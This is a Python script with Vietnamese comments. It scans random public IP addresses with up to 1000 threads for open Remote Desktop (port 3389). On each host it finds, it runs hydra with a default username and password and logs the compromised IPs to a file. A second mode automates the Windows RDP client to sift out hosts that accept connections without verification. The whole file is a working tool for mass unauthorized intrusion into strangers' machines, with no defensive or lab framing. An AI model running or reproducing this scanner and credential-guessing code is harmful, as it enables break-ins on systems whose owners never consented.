import threading
import random
import socket
import time
import os
import platform

system_name = platform.system()

class ScaningIP:
    def __init__(self, port=3389, path="server.txt", thread_num=1000, user="Aaron", password="123456"):
        self.port = port
        self.path = path
        self.thread_num = thread_num
        self.user = user
        self.password = password


    # hàm tấn công
    def attack(self, ip):
        rdp_result = os.popen(f"hydra -t 1 -l {self.user} -p {self.password} rdp://{ip}").read()
        rdp_result = int(rdp_result.split("completed, ")[1].split(" valid password")[0])
        if rdp_result == 1:
            return True
        else:
            return False

    # dò ip rdp
    def random_ip(self):
        g1 = str(random.choice([i for i in range(253)]))
        g2 = str(random.choice([i for i in range(253)]))
        g3 = str(random.choice([i for i in range(253)]))
        g4 = str(random.choice([i for i in range(253)]))
        return f"{g1}.{g2}.{g3}.{g4}"

    def collect_rdp(self):
        while True:
            ip = self.random_ip()
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                check_result = s.connect_ex((ip, self.port))
                if check_result == 0:
                    print(f"IP: {ip} Trạng thái: Mở")

                    # tấn công
                    attack_result = self.attack(ip=ip)
                    if attack_result == True:
                        print("tấn công thành công")
                        with open(self.path, mode="a", encoding="utf-8") as file:
                             file.write(ip)
                    else:
                        print("tấn công không thành công")

                s.close()
            except Exception as e:
                pass

    def scan_ip(self):
        threads = []
        for _ in range(self.thread_num):
            time.sleep(0.01)
            scan = threading.Thread(target=self.collect_rdp)
            threads.append(scan)
            scan.start()
        for thread in threads:
            thread.join()

    # lọc ra các ip rdp không có mật khẩu
    def filter_non_verify_ip(self):
        from pywinauto.application import Application
        with open(self.path, mode="r", encoding="utf-8") as file:
            IPs = file.read().splitlines()
        
        rdp_path = "mstsc.exe"
        app = Application(backend="uia").start(rdp_path)
        for ip in IPs:
            window = app.window(title="Remote Desktop Connection")
            write_ip = window.child_window(title="Computer:", control_type="Edit").wrapper_object()
            write_ip.type_keys(ip.strip())
            connect = window.child_window(title="Connect", control_type="Button").wrapper_object()
            connect.click()
            try:
                check_connect = window.child_window(title="Yes")
                if check_connect.is_visible():
                    print("Đây không phải là một VPS hợp lệ.")
                    close = window.child_window(title="No", control_type="Button")
                    close.click()
                    continue
            except:
                input("Đã tìm thấy, vui lòng nhập pass và user để thử. sau đó enter để tiếp tục : ")
                app.kill()
                app = Application(backend="uia").start(rdp_path)
                continue


def command_line():
    def attack():
        thread_num = int(input("nhập số luồng : "))
        user = input('nhập user, nếu không mặc định là Aaron, nhấn "d" để mặc định: ').strip()
        if user in "d":
            pass
        password = input('nhập password, mặc định là 12345, nhấn "d" để mặc định : ').strip()
        if password in "d":
            pass
        ScaningIP(thread_num=thread_num, user="Aaron", password="12345").scan_ip()
    def filter():
        ScaningIP().filter_non_verify_ip()
    
    inp = input("1 - attack (only linux)\n2 - lọc ip (only window) * chắc rằng tệp có IPs\nhãy chọn lựa trọn trên : ").strip()
    if inp in "1":
        attack()
    else:
        filter()
command_line()
